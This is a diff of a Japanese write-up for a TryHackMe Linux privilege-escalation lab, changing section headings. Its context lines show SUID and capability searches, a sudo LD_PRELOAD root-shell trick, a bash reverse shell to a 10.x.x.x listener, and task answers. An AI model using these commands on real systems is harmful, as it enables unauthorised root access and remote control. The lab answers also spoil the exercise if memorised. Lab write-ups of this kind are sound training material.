@@ -63,7 +63,7 @@ $ find / -perm -u=s -type f 2>/dev/null # SUIDビットガセットされてい�
 - [https://www.linuxkernelcves.com/cves](https://www.linuxkernelcves.com/cves)
 - LES (Linux Exploit Suggester) などのスクリプトを使用する。
 
-### タスク5の質問と解答
+### タスク5の解答
 
 [ここ](https://www.exploit-db.com/exploits/37292)にあるコードをコンパイルして実行するとルートになれる。
 
@@ -113,7 +113,7 @@ sudoで実行できるプログラムを実行時に、この共有オブジェ�
 $ sudo LD_PRELOAD=/home/user/ldpreload/shell.so find
 ```
 
-### タスク6の質問と解答
+### タスク6の解答
 
 1. sudo -lの出力を確認すればよい。
 2. /home/ubuntuにflag2.txtがあるのでcatで見る。
@@ -130,7 +130,7 @@ $ openssl passwd -l -salt THM password1
 $1$THM$WnbwlliCqxFRQepUTCkUT1
 ```
 
-### タスク7の質問と解答
+### タスク7の解答
 
 1. cat /etc/passwdの表示を確認。
 2. 以下の手順で確認。
@@ -191,7 +191,7 @@ $ getcap -r / 2>/dev/null
 
 表示結果のコマンドを [GTFOBins](https://gtfobins.github.io/#%2BCapabilities)で調べる
 
-### タスク8の質問と回答
+### タスク8の回答
 
 1. 解答不要。
 2. getcap -r / 2>/dev/null で確認。
@@ -217,7 +217,7 @@ bash -i >& /dev/tcp/10.x.x.x/7777 0>&1
 $ nc -lnvp 7777
 ```
 
-### タスク9の質問と解答
+### タスク9の解答
 
 1. cat /etc/crontabで確認。
 2. 以下の手順で確認。
@@ -285,7 +285,7 @@ $ ./pash
 $ find / -writable 2>/dev/null | cut -d "/" -f2,3 | grep -v proc | sort -u
 ```
 
-### タスク10 の質問と解答 
+### タスク10 の解答 
 
 1. 書き込み可能なフォルダ検索方法に記載のコマンドを実行して確認。
 2. 解答不要。
@@ -374,7 +374,7 @@ $ ls -l nfs
 
 5. 作成した実行可能ファイル(上記例だとnfs)をターゲットマシンで実行。
 
-### タスク11の質問と解答
+### タスク11の解答
 
 1. 攻撃マシンで "showmount -e ターゲットマシンのIP" の結果を確認。
 2. ターゲットマシンで"cat /etc/exports"の結果を確認。
@@ -383,7 +383,7 @@ $ ls -l nfs
 
 ## Task12 Capstone Challenge
 
-### タスク12の質問と解答
+### タスク12の解答
 
 1. 以下の手順で確認。
 
